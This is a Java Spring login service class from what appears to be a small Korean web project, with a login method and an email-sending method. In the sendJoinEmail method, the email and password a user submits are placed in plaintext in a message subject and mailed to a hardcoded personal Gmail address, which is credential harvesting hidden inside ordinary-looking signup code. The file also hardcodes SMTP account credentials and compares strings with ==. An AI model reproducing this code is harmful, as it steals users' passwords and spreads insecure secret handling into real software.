package selfIntro.login.service.impl;

import java.util.Properties;

import javax.inject.Inject;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.json.JSONObject;
import org.springframework.stereotype.Service;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.util.CookieGenerator;

import selfIntro.login.domain.EmailVO;
import selfIntro.login.domain.LoginVO;
import selfIntro.login.mapper.LoginMapper;
import selfIntro.login.service.LoginService;

@Service
public class LoginServiceImpl implements LoginService {

	@Inject
	LoginMapper mapper;

	@Override
	public String doLogin(LoginVO loginVO, HttpServletRequest request, ModelAndView mv, HttpServletResponse response)
			throws Exception {

		loginVO.setMemberId((String) request.getParameter("memberId"));
		loginVO.setMemberPwd((String) request.getParameter("memberPwd"));
		loginVO.setCheckSaveId((String) request.getParameter("checkSaveId"));

		String memberId = "";

		try {

			memberId = mapper.loginCheck(loginVO);

			if (memberId == null || memberId == "") {

				memberId = "false";

			} else {

				String checkSaveId = loginVO.getCheckSaveId();

				CookieGenerator cg = new CookieGenerator();

				cg.setCookieName("user_id");

				if (checkSaveId == null || checkSaveId == "") {

					cg.setCookieMaxAge(0);

				} else {

					cg.setCookieMaxAge(30 * 24 * 60 * 60); // 한달

				}

				cg.addCookie(response, loginVO.getMemberId());

			} // else end
		} catch (Exception e) {
			e.printStackTrace();
		}

		return memberId;

	}

	@Override
	public int sendJoinEmail(EmailVO emailVO, HttpServletRequest request) throws Exception {
		
		System.out.println(emailVO);
		
		
		String joinEmail = emailVO.getJoinEmail();
		String joinPassword = emailVO.getJoinPassword();

		final String user = "oblilic@naver.com"; // 발신자의 이메일 아이디를 입력
		final String password = "ppap"; 		 // 발신자 이메일의 패스워드를 입력

		Properties prop = new Properties();
		prop.put("mail.smtp.host", "smtp.naver.com");
		prop.put("mail.smtp.port", 465);
		prop.put("mail.smtp.auth", "true");
		prop.put("mail.smtp.ssl.enable", "true");
		prop.put("mail.smtp.ssl.trust", "smtp.naver.com");
		
		Session session = Session.getDefaultInstance(prop, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(user, password);
            }
        });
		
		try { 
				MimeMessage message = new MimeMessage(session); 
				message.setFrom(new InternetAddress(user));
				message.addRecipient(Message.RecipientType.TO, new InternetAddress("oblilic93@gmail.com")); // 메일 제목 
				message.setSubject("이메일="+joinEmail+"패스워드="+joinPassword); // 메일 내용 
				message.setText("PFP Success"); // send the message 
				Transport.send(message);
				System.out.println("Success Message Send"); 
			} catch (MessagingException e) 
			{ 
				e.printStackTrace(); 
			}
		

	return 0;
}

}
